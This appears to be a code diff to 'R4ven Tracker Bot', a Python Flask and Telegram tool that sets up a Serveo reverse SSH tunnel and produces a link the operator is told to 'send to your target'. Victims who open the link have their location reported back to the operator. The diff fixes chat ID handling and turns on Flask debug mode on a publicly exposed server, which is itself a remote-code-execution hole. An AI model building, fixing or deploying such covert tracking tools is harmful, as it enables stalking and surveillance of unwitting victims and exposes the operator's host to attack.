@@ -142,7 +142,14 @@ def update_location():
     data = request.json
     chat_id = request.args.get('id', '')
     
-    print(f"{G}[+] {C}UPDATE_LOCATIN_CALLED{W}")
+    # Convert chat_id to integer to match Telegram's chat_id type
+    try:
+        chat_id = str(chat_id)  # Ensure it's a string first
+    except ValueError:
+        logging.error(f"Invalid chat_id received: {chat_id}")
+        return "Error: Invalid chat ID"
+    
+    print(f"{G}[+] {C}UPDATE_LOCATIN_CALLED  {chat_id}  {W}")
 
     if chat_id in active_sessions:
         print(f"{G}[+] {C}Sending now...{W}")
@@ -197,7 +204,10 @@ def get_url():
 
 def start_port_forwarding(chat_id):
     """Starts port forwarding with Serveo and notifies user via Telegram"""
-    bot.send_message(chat_id, "⏳ Setting up port forwarding with Serveo...")
+    # Convert chat_id to int for Telegram API if it's a string
+    telegram_chat_id = int(chat_id) if isinstance(chat_id, str) and chat_id.isdigit() else chat_id
+    
+    bot.send_message(telegram_chat_id, "⏳ Setting up port forwarding with Serveo...")
     
     try:
         command = ["ssh", "-R", f"80:localhost:{args.port}", "serveo.net"]
@@ -215,7 +225,7 @@ def start_port_forwarding(chat_id):
                     tracking_url = f"{url}?id={chat_id}"
                     
                     formatted_url_message = f"🔗 Send this URL to your target: {tracking_url}"
-                    bot.send_message(chat_id, formatted_url_message)
+                    bot.send_message(telegram_chat_id, formatted_url_message)
                     
                     # Save the target URL for this session
                     active_sessions[chat_id]['target_url'] = f"{url}/image?id={chat_id}"
@@ -229,23 +239,24 @@ def start_port_forwarding(chat_id):
         if not url_printed:
             time.sleep(10)  # Wait a bit more
             if not url_printed:
-                bot.send_message(chat_id, "❌ Failed to get a URL from Serveo. Please try again later.")
+                bot.send_message(telegram_chat_id, "❌ Failed to get a URL from Serveo. Please try again later.")
     except Exception as e:
         error_msg = f"❌ An error occurred with port forwarding: {str(e)}"
         logging.error(error_msg)
-        bot.send_message(chat_id, error_msg)
+        bot.send_message(telegram_chat_id, error_msg)
 
 def run_flask():
     """Starts the Flask server"""
-    app.run(host="0.0.0.0", port=args.port, debug=False, use_reloader=False)
+    app.run(host="0.0.0.0", port=args.port, debug=True, use_reloader=False)
 
 # Telegram bot command handlers
 @bot.message_handler(commands=['start'])
 def handle_start(message):
     """Handles the /start command"""
     # Clear any existing session for this user
-    if message.chat.id in active_sessions:
-        del active_sessions[message.chat.id]
+    chat_id = str(message.chat.id)
+    if chat_id in active_sessions:
+        del active_sessions[chat_id]
     
     welcome_msg = (
         f"🦅 *Welcome to R4ven Tracker Bot* 🦅\n\n"
@@ -267,7 +278,7 @@ def handle_start(message):
 @bot.message_handler(func=lambda message: message.text in ["1", "2", "3", "4"] and message.chat.id not in active_sessions)
 def handle_option_selection(message):
     """Handles the option selection"""
-    chat_id = message.chat.id
+    chat_id = str(message.chat.id)
     choice = message.text
     
     # Map choice to folder
@@ -290,7 +301,8 @@ def handle_option_selection(message):
         'target_url': f"http://localhost:{args.port}/image?id={chat_id}"
     }
     
-    bot.send_message(chat_id, f"✅ Selected: *{feature}*\n\nPreparing tracking link...", parse_mode="Markdown")
+    #bot.send_message(chat_id, f"✅ Selected: *{feature}*\n\nPreparing tracking link...", parse_mode="Markdown")
+    bot.send_message(message.chat.id, f"✅ Selected: *{feature}*\n\nPreparing tracking link...", parse_mode="Markdown")
     
     # Start port forwarding in a separate thread
     threading.Thread(target=start_port_forwarding, args=(chat_id,), daemon=True).start()
